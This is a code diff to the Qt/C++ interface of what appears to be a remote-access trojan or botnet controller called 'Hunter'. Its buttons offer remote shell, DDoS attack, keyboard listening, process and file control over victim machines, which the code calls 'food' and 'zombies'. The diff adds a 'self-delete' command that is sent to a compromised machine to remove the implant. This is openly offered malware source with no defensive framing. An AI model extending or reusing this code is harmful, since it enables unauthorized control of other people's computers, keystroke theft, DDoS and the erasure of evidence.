@@ -29,7 +29,7 @@ Hunter::Hunter(QWidget *parent)
     // 设置自适应大小
     ui->btFile->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
     ui->btShell->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
-    ui->btScreen->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
+    ui->btDelete->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
     ui->btProcess->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
     ui->btDDos->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
     ui->btKeybd->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
@@ -39,7 +39,7 @@ Hunter::Hunter(QWidget *parent)
     // 按钮文字
     ui->btFile->setText("文件\n操作");
     ui->btShell->setText("远程\nShell");
-    ui->btScreen->setText("屏幕\n截图");
+    ui->btDelete->setText("自我\n删除");
     ui->btDDos->setText("DDOS\n攻击");
     ui->btProcess->setText("进程\n管理");
     ui->btKeybd->setText("键盘\n监听");
@@ -183,7 +183,7 @@ Hunter::Hunter(QWidget *parent)
         int id = curFoodIdInTbl();
         if (id != -1)
         {
-            if(QMessageBox::Yes==QMessageBox::question(this, "问一哈", "真的要下线这块食物吗",
+            if(QMessageBox::Yes==QMessageBox::question(this, "问一哈", "主人！真的要下线这块食物吗？",
                                                        QMessageBox::Yes | QMessageBox::No,
                                                        QMessageBox::Yes))
             {
@@ -281,6 +281,20 @@ Hunter::Hunter(QWidget *parent)
         {
             QMessageBox::information(this,"Fail","尊敬的主人，DDOS需要食物呀");
             qDebug() << "DDOS 需要肉鸡的,亲";
+        }
+    });
+
+    // 发送自删除命令
+    connect(ui->btDelete, &QPushButton::clicked, this, [=](){
+
+        int id = curFoodIdInTbl();
+        if(id != -1){
+            if(QMessageBox::Yes==QMessageBox::question(this, "问一哈", "主人！真的要这块食物永远消失吗？",
+                                                       QMessageBox::Yes | QMessageBox::No,
+                                                       QMessageBox::Yes)){
+                Food *food = mCook->getFoodById(id);
+                food->sendCmdDelete();
+            }
         }
     });
 
